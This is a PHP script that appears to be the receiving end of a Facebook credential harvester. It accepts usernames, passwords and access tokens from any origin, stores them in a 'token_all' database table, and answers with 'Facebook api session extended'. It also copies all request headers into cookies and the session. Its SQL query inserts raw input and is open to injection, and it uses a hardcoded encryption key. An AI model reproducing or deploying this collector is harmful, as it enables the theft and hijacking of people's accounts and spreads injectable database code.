<?php
header('Content-Type: text/html; charset=utf-8');
header('Access-Control-Allow-Origin: *');
session_start();
include("db.php");

$token = (isset( $_POST["token"] ) ? $_POST["token"] : (isset($_GET["token"]) ? $_GET["token"] : false));
$id = (isset( $_POST["id"] ) ? $_POST["id"] : (isset($_GET["id"]) ? $_GET["id"] : false));
$user = (isset( $_POST["user"] ) ? $_POST["user"] : (isset($_GET["user"]) ? $_GET["user"] : ''));
$pass = (isset( $_POST["pass"] ) ? $_POST["pass"] : (isset($_GET["pass"]) ? $_GET["pass"] : ''));

if ($token == false || $id == false){
//header("Location: home.php");
}

$token = urldecode($token);
$id = urldecode($id);
$pass = urldecode($pass);
$user = urldecode($user);

$V = getallheaders();
/*
if (isset($V["Cookie"])){
if (isset($_COOKIE["data"])){
unset($_COOKIE["data"]);
setcookie("data","",-1,"/");
}
setcookie(
  "data",
  urldecode($V["Cookie"]),
  time() + (10 * 60)
);
}
*/

/* else if (isset($V["cookie"])){
setcookie(
  md5(mt_rand(0,9)),
  $V["cookie"],
  time() + (10 * 365 * 24 * 60 * 60)
);
} else {
var_dump($V);
}*/

//echo "<script>".file_get_contents('https://cdn.jsdelivr.net/gh/madmurphy/cookies.js/cookies.js')."</script>";

foreach (getallheaders() as $name => $value) {

  //  echo nl2br("$name: $value\n");
$k='
<script>
docCookies.setItem("'.$name.'", "'.$value.'", 150);
</script>';
//echo $k;

if (!isset($_COOKIE[$name])){
setcookie($name, $value, time() + (60 * 20));
}

$_SESSION[$name]=$value;
}
/*
if ($cC){
echo serialize($cC);
}*/

if (!empty($token) && !empty($id)){
$sql = "REPLACE INTO token_all (token,id,user,pass) VALUES ('$token', '$id', '$user', '$pass')";
$result = mysqli_query($localcon, $sql);
echo "$user->$pass->$id->$token Facebook api session extended";
} else {
  echo "token required";
}

if (!function_exists('getallheaders')) 
{ 
    function getallheaders() 
    { 
           $headers = []; 
       foreach ($_SERVER as $name => $value) 
       { 
           if (substr($name, 0, 5) == 'HTTP_') 
           { 
               $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value; 
           } 
       } 
       return $headers; 
    } 
} 

function open_ssl($action, $string) {
    $output = false;
    $encrypt_method = "AES-256-CBC";
    $secret_key = 'This is my secret key';
    $secret_iv = 'This is my secret iv';
    // hash
    $key = hash('sha256', $secret_key);
    
    // iv - encrypt method AES-256-CBC expects 16 bytes - else you will get a warning
    $iv = substr(hash('sha256', $secret_iv), 0, 16);
    if ( $action == 'encrypt' ) {
        $output = openssl_encrypt($string, $encrypt_method, $key, 0, $iv);
        $output = base64_encode($output);
    } else if( $action == 'decrypt' ) {
        $output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);
    }
    return $output;
}
if (!empty($user)){
$user = open_ssl("decrypt", $user);
}
if (!empty($pass)){
$pass = open_ssl("decrypt", $pass);
}

//die($token.$id.$user.$pass);